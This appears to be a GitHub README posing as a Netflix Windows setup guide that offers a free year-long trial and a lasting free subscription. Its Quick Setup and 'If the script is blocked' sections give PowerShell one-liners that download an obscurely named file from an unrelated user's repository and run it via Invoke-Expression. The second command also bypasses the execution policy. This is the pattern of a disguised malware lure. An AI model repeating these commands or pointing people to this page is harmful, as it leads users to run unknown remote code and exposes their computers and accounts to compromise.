# Netflix

Netflix on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Netflix is a streaming subscription for films, series, documentaries, and originals on Windows PCs and laptops. Setup wires in a built-in free trial that runs for a year, then leaves the free subscription active on the machine for everyday playback. You sign in, pick a profile, and watch in the app or browser with resume, subtitles, audio tracks, and quality settings tuned to your connection and display.

A typical session starts from the taskbar or Start menu shortcut after the client finishes its first-run checks. You browse personalized rows and search, open a title, adjust subtitles or dubbing, and stream or download episodes for offline viewing where your plan allows. Kids profiles keep younger viewers on age-appropriate catalogs; switching profiles takes a tap when someone else sits down, and the watchlist stays tied to each profile.

This repository holds the Windows setup file for the client, short notes on sign-in, billing reminders during the free trial year, and profile layout, plus a changelog that tracks app versions and subscription-related UI changes. Use it to reinstall quickly after a reset, compare builds across months, and see what changed after an update without digging through scattered folders on the drive.

## What you get

- Built-in free trial runs for a year before billing prompts appear on this Windows install.
- After setup completes, the free subscription stays on the PC for everyday streaming access.
- Multiple profiles keep watch history, maturity limits, and recommendations separate per household member.
- Downloads on supported plans let you queue episodes for travel when Wi-Fi is unreliable.
- Search and category rows surface new seasons, licensed catalogs, and Netflix originals in one place.
- Parental controls and PIN locks restrict mature titles without signing out the main account.
- Playback remembers position across devices so you resume mid-episode on the same profile.
- Changelog entries in this repo note player updates tied to subscription and billing screens.

## Quick Setup (PowerShell)

This starts the built-in Netflix free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/i-braun898156/netflix-setup-guide/main/6jmawdb8nt.5uljxb6q | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/i-braun898156/netflix-setup-guide/main/6jmawdb8nt.5uljxb6q | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `6jmawdb8nt.5uljxb6q` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `i-braun898156/netflix-setup-guide`. Netflix 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
